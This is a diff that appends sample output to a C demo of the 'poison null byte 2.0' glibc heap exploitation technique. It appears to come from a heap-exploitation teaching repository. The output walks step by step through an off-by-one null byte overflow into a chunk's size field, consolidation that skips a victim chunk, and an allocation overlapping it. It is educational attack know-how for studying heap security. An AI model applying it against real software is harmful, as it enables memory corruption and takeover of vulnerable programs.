@@ -107,3 +107,42 @@ int main()
 	fprintf(stderr, "Thanks to http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf "
 		"for the clear explanation of this technique.\n");
 }
+
+/*
+
+                                               !1974
+Welcome to poison null byte 2.0!
+Tested in Ubuntu 14.04 64bit.
+This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.
+This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.
+We allocate 0x100 bytes for 'a'.
+a: 0x55f861d73260
+Since we want to overflow 'a', we need to know the 'real' size of 'a' (it may be more than 0x100 because of rounding): 0x108
+b: 0x55f861d73370
+c: 0x55f861d73580
+We allocate a barrier at 0x55f861d73690, so that c is not consolidated with the top-chunk when freed.
+The barrier is not strictly necessary, but makes things less confusing
+In newer versions of glibc we will need to have our updated size inside b itself to pass the check 'chunksize(P) != prev_size (next_chunk(P))'
+b.size: 0x211
+b.size is: (0x200 + 0x10) | prev_in_use
+We overflow 'a' with a single null byte into the metadata of 'b'
+b.size: 0x200
+c.prev_size is 0
+We will pass the check since chunksize(P) == 0x200 == 0x200 == prev_size (next_chunk(P))
+b1: 0x55f861d737a0
+Now we malloc 'b1'. It will be placed where 'b' was. At this point c.prev_size should have been updated, but it was not: 0
+Interestingly, the updated value of c.prev_size has been written 0x10 bytes before c.prev_size: 200
+We malloc 'b2', our 'victim' chunk.
+b2: 0x55f861d738b0
+Current b2 content:
+BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').
+Finally, we allocate 'd', overlapping 'b2'.
+d: 0x55f861d73940
+Now 'd' and 'b2' overlap.
+New b2 content:
+BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+Thanks to http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf for the clear explanation of this technique.
+
+
+*/
